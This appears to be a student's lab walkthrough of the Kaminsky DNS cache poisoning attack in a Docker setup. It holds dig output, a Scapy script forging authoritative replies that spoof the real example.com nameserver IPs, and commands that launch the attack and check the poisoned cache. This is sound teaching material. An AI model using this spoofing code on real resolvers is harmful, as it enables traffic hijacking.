# Kaminsky Steps

## Testing dig tool

```
> docker exec user-10.9.0.5 dig www.example.com

; <<>> DiG 9.16.1-Ubuntu <<>> www.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 33138
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 5c3ce826168fdb7801000000628a5ec4e90db0f6af5a9a9e (good)
;; QUESTION SECTION:
;www.example.com.		IN	A

;; ANSWER SECTION:
www.example.com.	86400	IN	A	93.184.216.34

;; Query time: 368 msec
;; SERVER: 10.9.0.53#53(10.9.0.53)
;; WHEN: Sun May 22 16:03:16 UTC 2022
;; MSG SIZE  rcvd: 88
```

## Finding IP addresses

```
┌──(kali㉿kali)-[~/…/category-network/DNS_Remote/Labsetup/volumes]
└─$ dig SOA www.example.com 

; <<>> DiG 9.18.0-2-Debian <<>> SOA www.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24354
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.example.com.               IN      SOA

;; AUTHORITY SECTION:
example.com.            434     IN      SOA     ns.icann.org. noc.dns.icann.org. 2022040423 7200 3600 1209600 3600

;; Query time: 107 msec
;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)
;; WHEN: Tue May 10 09:18:27 EDT 2022
;; MSG SIZE  rcvd: 100
```

```
┌──(kali㉿kali)-[~]
└─$ dig @ns.icann.org www.example.com

; <<>> DiG 9.18.0-2-Debian <<>> @ns.icann.org www.example.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12758
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.example.com.               IN      A

;; ANSWER SECTION:
www.example.com.        86400   IN      A       93.184.216.34

;; AUTHORITY SECTION:
example.com.            86400   IN      NS      a.iana-servers.net.
example.com.            86400   IN      NS      b.iana-servers.net.

;; Query time: 115 msec
;; SERVER: 199.4.138.53#53(ns.icann.org) (UDP)
;; WHEN: Mon May 09 17:04:47 EDT 2022
;; MSG SIZE  rcvd: 108
```

```
> dig b.iana-servers.net
; <<>> DiG 9.16.1-Ubuntu <<>> b.iana-servers.net
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 13091
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;b.iana-servers.net.        IN    A

;; ANSWER SECTION:
b.iana-servers.net.    980    IN    A    199.43.133.53

;; Query time: 0 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Sat May 07 11:33:28 EDT 2022
;; MSG SIZE  rcvd: 63

> dig a.iana-servers.net

; <<>> DiG 9.16.1-Ubuntu <<>> a.iana-servers.net
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25859
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;a.iana-servers.net.        IN    A

;; ANSWER SECTION:
a.iana-servers.net.    1465    IN    A    199.43.135.53

;; Query time: 12 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Sat May 07 11:33:32 EDT 2022
;; MSG SIZE  rcvd: 63
```

## Code

```py
from scapy.all import * 

attackerIP = "10.9.0.1"
apoloIP = "10.9.0.53"
nsIPs = ["199.43.133.53", "199.43.135.53"]

domain = 'example.com'
name = 'aaaaa.example.com'
ns = 'ns.attacker32.com'
port = RandShort()

# DNS Query
Qdsec = DNSQR(qname=name)
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
ip = IP(dst=apoloIP, src=attackerIP)
udp = UDP(dport=53, sport=33333, chksum=0)
request = ip/udp/dns

# Save the packet to a file
with open('ip_req.bin', 'wb') as f:
    f.write(bytes(request))

# Spoofed DNS reply
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata="1.2.3.5", ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
    qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst=apoloIP, src=nsIPs[0])
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(reply))
```

```sh
# Go to shared folder
cd Kaminsky/Labsetup/volumes

# Generate packets with scapy
python3 gen-packet.py 
ls -l *.bin

# Compile C code
gcc -o attack.o attack.c
ls -l *.o
```

## Launching the attack

```sh
# Apply filter to wireshark
Wireshark filter:  ip.dst==10.9.0.153

# Execute Kaminsky attack
docker exec seed-attacker /bin/sh -c "cd volumes && ./attack.o"
```

## Results
```sh
# Check DNS cache
docker exec local-dns-server-10.9.0.53 /bin/sh -c "rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db"

# Check dig tool
docker exec user-10.9.0.5 dig www.example.com

cd ../../..
```